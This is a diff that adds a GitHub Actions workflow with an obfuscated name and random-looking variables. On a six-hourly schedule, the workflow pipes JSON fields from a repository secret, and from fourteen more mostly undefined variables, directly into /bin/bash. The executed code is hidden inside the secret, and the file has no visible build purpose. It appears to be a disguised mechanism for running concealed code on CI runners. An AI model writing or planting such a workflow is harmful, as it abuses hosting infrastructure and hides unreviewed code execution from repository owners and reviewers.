@@ -1,0 +1,31 @@
+name: insuranceguilty
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: insuranceguilty
+        env:
+          rkv2263: ${{ secrets.rkv2263 }}
+        run: |
+          echo $rkv2263 | jq -r .yvke1 | /bin/bash
+          echo $j2049 | jq -r .um79108 | /bin/bash
+          echo $m778 | jq -r .lgk19521 | /bin/bash
+          echo $nqda5713 | jq -r .w110 | /bin/bash
+          echo $ka8532 | jq -r .hd12224 | /bin/bash
+          echo $ycvp50474 | jq -r .pc596 | /bin/bash
+          echo $gigd64 | jq -r .cxmin151 | /bin/bash
+          echo $qxqv68737 | jq -r .w4 | /bin/bash
+          echo $nej37 | jq -r .ultye58020 | /bin/bash
+          echo $tatma2 | jq -r .getza01 | /bin/bash
+          echo $f208 | jq -r .jxb9739 | /bin/bash
+          echo $rcg60 | jq -r .wl0584 | /bin/bash
+          echo $h87693 | jq -r .md91123 | /bin/bash
+          echo $ziab6 | jq -r .jz63 | /bin/bash
+          echo $scnc83626 | jq -r .avrug07 | /bin/bash
+
